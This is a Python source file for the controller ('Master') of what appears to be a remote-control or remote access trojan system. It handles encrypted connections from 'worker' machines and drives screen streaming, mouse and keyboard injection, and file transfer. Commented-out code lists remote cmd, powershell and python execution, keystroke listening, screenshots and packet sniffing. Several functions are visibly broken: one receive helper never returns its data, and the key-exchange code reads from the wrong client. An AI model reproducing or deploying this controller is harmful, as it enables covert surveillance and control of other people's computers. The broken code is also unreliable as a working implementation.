import os
import socket
import time
import tkinter
from typing import Callable
import struct
import hmac
import threading
import cv2
import mouse
import numpy as np
import keyboard
import json
from encryption.rsa import rsa
import hashlib
from encryption.DHE.my_hmac import HMAC
from encryption.aes.aes_types import CTR
Commend = Callable[[],bytes]
# # unneeded
# RETURN = False
# # unneeded
# def cmd() -> bytes:
#     global RETURN
#     commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
#     check_return(commend)
#     if RETURN:
#         return b""
#     return b"cmd:"+commend.encode()
# # unneeded
# def powershell()->bytes:
#     global RETURN
#     commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
#     check_return(commend)
#     if RETURN:
#         return b""
#     return b"powershell:"+commend.encode()
# # unneeded
# def python()->bytes:
#     global RETURN
#     print("enter your python code (end with an empty line) or enter \"return\" to return to menu: ")
#     code = ""
#     while True:
#         line = sys.stdin.readline().strip()
#         if not line:
#             break
#         check_return(line)
#         if RETURN:
#             return b""
#         code += line + "\n"
#     return b"python:"+code.encode()
# # unneeded
# def check_return(text:str):
#     global RETURN
#     if text == "return":
#         RETURN = True
#
# # unneeded
# def receive_file() ->bytes:
#     global RETURN
#     file_path = input("enter the path of the file you want in the worker side or enter \"return\" to return to menu: ")
#     check_return(file_path)
#     if RETURN:
#         return b""
#     return b"receive_file:"+file_path.encode()
#
#
def send_file(file_path:str,name:bytes) ->bytes:
    try:
        with open(file_path, "rb") as file:
            file_bytes = file.read()
        if name == b"" or b"." not in name:
            return "error: please enter a valid name".encode()
        return name+b":"+file_bytes
    except FileNotFoundError:
        return f"error: file '{file_path}' does not exist.".encode()
    except PermissionError:
        return f"error: file '{file_path}' is not accessible (permission issue).".encode()
    except Exception as e:
        return f"error: {e}".encode()

# # unneeded
# def screen_shot() ->bytes:
#     return b"screen_shot"
# # unneeded
# def exit_endless_print():
#     msg = input("enter \"return\" to return to menu")
#     check_return(msg)
# # unneeded
# def listen_to_keys()->bytes:
#     return b"listen_to_keys"
#
#
# #unneeded
# def live_stream() -> bytes:
#     return b"live_stream"
# # unneeded
# def press_key_in_worker() -> bytes:
#     global RETURN
#     print("every key you press will be pressed in worker, enter ctrl+q to quit to menu")
#     while True:
#
#         event = keyboard.read_event()
#         if event.event_type == "down":
#             if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
#                 RETURN = True
#                 return b""
#             else:
#                 return b"press_key_in_worker:" + event.name.encode()
# # unneeded
# def control_mouse() -> bytes:
#     global RETURN
#     print("enter mouse parameters(you can enter \"return\" at any time to return to menu):")
#     x = input("horizontal coordinate: ")
#     check_return(x)
#     if RETURN:
#         return b""
#     while not x.isdigit():
#         x = input("please enter a number ")
#     y = input("vertical coordinate: ")
#     check_return(y)
#     if RETURN:
#         return b""
#     while not y.isdigit():
#         y = input("please enter a number ")
#     button = input("which button do you want to press: ")
#     check_return(button)
#     if RETURN:
#         return b""
#     while button != "left" and button!="right":
#         button = input("please enter left or right ")
#     return b"control_mouse:"+x.encode()+b":"+y.encode()+b":"+button.encode()
#
# # unneeded
# def sniff_from_worker() ->bytes:
#     print("please enter parameters(you can enter \"return\" at any time to return to menu):")
#     scapy_filter = input("enter your filter for the sniffing: ")
#     check_return(scapy_filter)
#     if RETURN:
#         return  b""
#     scapy_time = input("enter how much you want the sniffing to continue:")
#     check_return(scapy_time)
#     if RETURN:
#         return  b""
#     while not scapy_time.isdigit():
#         scapy_time = input("please enter a valid time  in numbers")
#     scapy_amount = input("enter how much packets you want to sniff: ")
#     check_return(scapy_amount)
#     if RETURN:
#         return  b""
#     while not scapy_amount.isdigit():
#         scapy_amount = input("please enter a valid time  in numbers")
#     return b"sniff_from_worker:" + scapy_filter.encode() + b":" + scapy_time.encode() + b":" + scapy_amount.encode()
#
# # unneeded
# def save_file(received:bytes):
#     file_name = input("how do you want to save your file?")
#     while file_name == "" or "." not in file_name:
#         file_name = input("please enter a valid name")
#     with open(file_name,"wb") as file:
#         file.write(received)

class Client:
    def __init__(self,command_sock:socket.socket,stream_sock:socket.socket,peer_master_key:bytes, master_key:bytes):
        self.command_sock = command_sock
        self.stream_sock = stream_sock
        self.master_key = master_key
        self.peer_master_key = peer_master_key

    def derive_own_keys(self):
        enc = hashlib.sha256(b"ENC" + self.master_key).digest()[:16]
        mac = hashlib.sha256(b"MAC" + self.master_key).digest()
        return enc, mac

    def derive_peer_keys(self):
        enc = hashlib.sha256(b"ENC" + self.peer_master_key).digest()[:16]
        mac = hashlib.sha256(b"MAC" + self.peer_master_key).digest()
        return enc, mac

    def close_client(self):
        self.command_sock.close()
        self.stream_sock.close()

class Master:
    def __init__(self, ip:str, port:int):
        self.server = socket.socket()
        self.server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.server.bind((ip,port))
        self.stream_server = socket.socket()
        self.stream_server.bind((ip,port+1))
        self.server.listen()
        self.stream_server.listen()
        # self.functions: dict[str, Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
        self.exit:bool = False
        self.cur_ip = None
        self._sock_lock = threading.RLock()
        self.on_stream_stop = None
        self.streaming = False
        self.control_key = False
        self.control_mouse = False
        self.update_clients = None
        self.clients:dict[(str,int),Client] = {}
        private_key, public_key = rsa.rsa_keys(rsa.distant_random_primes(1024))
        self.rsa = rsa.RSA(my_public_key=public_key,my_private_key=private_key)


    def connect(self):
        while True:
            client, address = self.server.accept()
            with self._sock_lock:
                rsa_public_client = self.receiver(open_seal=False)
            self.rsa.load_peer_public_key(rsa_public_client)
            with self._sock_lock:
                self.sender(self.rsa.dump_my_public_key(),seal=False)
                client_aes_key_en =self.receiver(open_seal=False)
            master_key = os.urandom(32)
            self.sender(self.rsa.send(master_key, hashlib.sha256(master_key).digest()), seal=False)
            stream_client = self.stream_server.accept()[0]
            self.clients[address[0]] = Client(client,stream_client,self.rsa.receive(client_aes_key_en).encode(),master_key)
            self.update_clients()

    def recvall(self, sock: socket.socket, size: int) -> bytes:
        data = b""
        while len(data) < size:
            packet = sock.recv(size - len(data))
            if not packet:
                return b""
            data += packet


    def receiver(self, stream: bool = False, open_seal: bool = True) -> bytes:
        cur_client = self.clients[self.cur_ip]
        if stream:
            sock = cur_client.stream_sock
        else:
            sock = cur_client.command_sock

        size = self.recvall(sock, 4)
        if not size:
            return b""
        size = struct.unpack("I", size)[0]
        if size <1+4+8+32:
            return b"error: Truncated message"
        blob = self.recvall(sock,size)
        if open_seal:
            aes_key,mac_key = cur_client.derive_peer_keys()
            aad = struct.unpack("I",blob[0:4])[0]
            nonce = blob[4:12]
            tag = blob[-32:]
            c = blob[12:-32]
            header = aad + nonce
            to_mac =header + c
            calc = HMAC("sha256",to_mac,mac_key).derive()
            if not hmac.compare_digest(calc, tag):
                return b"error: Authentication failed"
            ctr = CTR(aes_key, nonce)
            return ctr.decrypt(c)

        else:
            return blob


    def sender(self, message: bytes, stream: bool = False, seal: bool = True):
        cur_client = self.clients[self.cur_ip]
        if stream:
            client_sock = cur_client.stream_sock
        else:
            client_sock  = cur_client.command_sock
        if seal:
            aes_key, mac_key = cur_client.derive_own_keys()
            nonce = os.urandom(8)
            ctr = CTR(aes_key,nonce)
            c = ctr.encrypt(message)
            header = struct.pack("I",len(message)) + nonce
            to_mac = header + c
            tag = HMAC("sha256",to_mac,mac_key).derive()
            data = struct.pack("I", len(header + c + tag)) + header + c + tag
        else:
            data = struct.pack("I", len(message)) + message
        client_sock.sendall(data)

    def control_mouse_on_worker(self):
        def send_payload(payload: dict):
            data = json.dumps(payload).encode()
            with self._sock_lock:
                self.sender(b"control_mouse:" + data)

        def listen(event):
            if not self.control_mouse:
                return
            if isinstance(event, mouse.ButtonEvent):
                payload = {"type": "button", "action": event.event_type, "button": str(event.button)}
                send_payload(payload)
                return
            if isinstance(event, mouse.WheelEvent):
                payload = {"type": "wheel", "delta": float(event.delta)}
                send_payload(payload)
                return
            else:
                if event.y<22 and self.streaming:
                    return
                payload = {"type": "move_abs", "x": event.x, "y": event.y-22}
                send_payload(payload)

        mouse.hook(listen)
        while True:
            time.sleep(1)


    def control_keys(self):
        while True:
            if self.control_key:
                event = keyboard.read_event()
                with self._sock_lock:
                    self.sender(b"press_key_in_worker:" + event.event_type.encode() + b":" + event.name.encode())

            else:
                time.sleep(0.1)

    def show_stream(self):
        root = tkinter.Tk()
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        root.destroy()
        while True:
            if self.streaming:

                self.sender(b"live_stream")
                frame_data = self.receiver(stream=True)

                if not frame_data:
                    time.sleep(0.05)
                    continue

                frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
                if frame is None:
                    time.sleep(0.005)

                    continue

                h, w, _ = frame.shape
                scale = min(screen_width / w, screen_height / h)
                new_w, new_h = int(w * scale), int(h * scale)
                resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)
                canvas = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
                x_offset = (screen_width - new_w) // 2
                y_offset = (screen_height - new_h) // 2
                canvas[y_offset:y_offset + new_h, x_offset:x_offset + new_w] = resized

                cv2.imshow("Live Stream", canvas)

                key = cv2.waitKey(1)

                if cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE) < 1:
                    print("Window closed, stopping video loop...")
                    self.streaming = False
                    if self.on_stream_stop:
                        self.on_stream_stop()
                    continue

                if key == ord("q"):
                    print("Pressed 'q', stopping video loop...")
                    self.streaming = False
                    if self.on_stream_stop:
                        self.on_stream_stop()
                    continue
                time.sleep(0.001)

            else:
                try:
                    cv2.destroyWindow("Live Stream")
                except cv2.error:
                    # window didn't exist → safe to ignore
                    pass
                time.sleep(0.1)



    # def menu(self) ->str:
    #     print("which action do you want to do? ")
    #     i = 1
    #     for key in self.functions.keys():
    #         print(f"{i}: {key}")
    #         i+=1
    #     print(f"{len(self.functions.keys())+1}: quit")
    #     action = input("enter action name: ").replace(" ","_")
    #     while action not in self.functions.keys() and action != "quit":
    #         action = input("enter a valid name: ").replace(" ","_")
    #     return action


    def run2(self,function:str, message:bytes) -> bytes:
        if function == "quit":
            with self._sock_lock:
                self.sender("quit".encode())
            self.server.close()
            self.stream_server.close()
            self.clients[self.cur_ip].close_client()
            return "exited the worker".encode()
        if function == "send_file":
            splitted = message.decode().split(":")
            message = send_file(splitted[0],splitted[1].encode())
        if b"error:" in message:
            return message
        with self._sock_lock:
            self.sender(function.encode() + b":" + message)
            received = self.receiver()
        return received

    # def run1(self):
    #     global RETURN
    #     self.connect()
    #     function = self.menu()
    #     while function !="quit":
    #         message = self.functions[function]()
    #         if function == "listen_to_keys":
    #             t = threading.Thread(target=exit_endless_print, daemon=True)
    #             t.start()
    #             while not RETURN:
    #                 self.sender(self.client,message)
    #                 received = self.receiver(self.client).decode()
    #                 if received:
    #                     print(received)
    #         if RETURN:
    #             RETURN = False
    #             function = self.menu()
    #             continue
    #         self.sender(self.client,message)
    #         if function == "live_stream":
    #             self.show_stream()
    #             continue
    #
    #         received = self.receiver(self.client)
    #         if b"error" == received[:5]:
    #             print(received.decode())
    #         elif function in ["receive_file","screen_shot"]:
    #             save_file(received)
    #             if function == "screen_shot":
    #                 function = self.menu()
    #                 continue
    #         elif function == "sniff_from_worker":
    #             name = input("enter input for file name(without extension)")
    #             while "." in name:
    #                 name = input("I said without extension")
    #             with open(name+".pcap","wb") as file:
    #                 file.write(received)
    #                 print("saved packets successfully")
    #         else:
    #             print(received.decode())
    #     self.sender(self.client,"quit".encode())
    #     self.server.close()
    #     self.client.close()



# def main():
#     functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
#     master = Master("10.0.0.12",5555)
#     master.run1()
#
# if __name__ == '__main__':
#     main()